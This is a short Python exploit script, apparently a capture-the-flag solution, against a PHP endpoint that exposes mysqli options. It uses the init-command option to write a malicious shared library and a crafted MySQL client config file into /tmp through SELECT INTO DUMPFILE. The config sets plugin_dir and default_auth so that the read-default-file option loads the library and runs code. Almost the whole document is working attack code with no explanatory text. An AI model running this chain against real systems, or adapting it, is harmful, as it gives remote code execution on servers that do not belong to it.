import requests, random, string
MYSQLI_INIT_COMMAND = 3
MYSQLI_READ_DEFAULT_FILE = 4
def send(key, value):
    r = requests.get(
        url = 'http://localhost:10047/index.php',
        params = {
           'key': key,
           'value': value
        }
    )
    print(value)
    print(r.text)

cnf_payload = b"""[client]
init_command = select sleep(3)
plugin_dir = /tmp/e10adc3949ba59abbe56e057f20f883e/
default_auth = hack
""".hex()
def rce():
    tmp_dir = '/tmp/e10adc3949ba59abbe56e057f20f883e/'
    cnf_name = 'aaa.cnf'
    # so_name = 'b1856f.phar'
    with open('hack.so','rb') as f:
        payload = f.read().hex()
    
    # upload so
    block_size = 1000
    for i in range(0,len(payload),block_size):
        send(MYSQLI_INIT_COMMAND, f'select 0x{payload[i:i+1000]} into dumpfile "{tmp_dir}tmp{i//1000}.so"')
    
    s = ','.join([f'(select load_file("{tmp_dir}tmp{x}.so"))' for x in range(len(payload) // block_size + 1)])
    send(MYSQLI_INIT_COMMAND, f'select concat({s}) into dumpfile "{tmp_dir}hack.so"')
    # upload cnf
    send(MYSQLI_INIT_COMMAND, f'select 0x{cnf_payload} into dumpfile "{tmp_dir}{cnf_name}"')
    print(f'{tmp_dir}{cnf_name}')
    # send(MYSQLI_INIT_COMMAND, 'select sleep(5)')
    send(MYSQLI_READ_DEFAULT_FILE, f'{tmp_dir}{cnf_name}')
"""
apt install sudo 
mysql --defaults-file=aaa.cnf -u test -p
"""

if __name__ == "__main__":
    rce()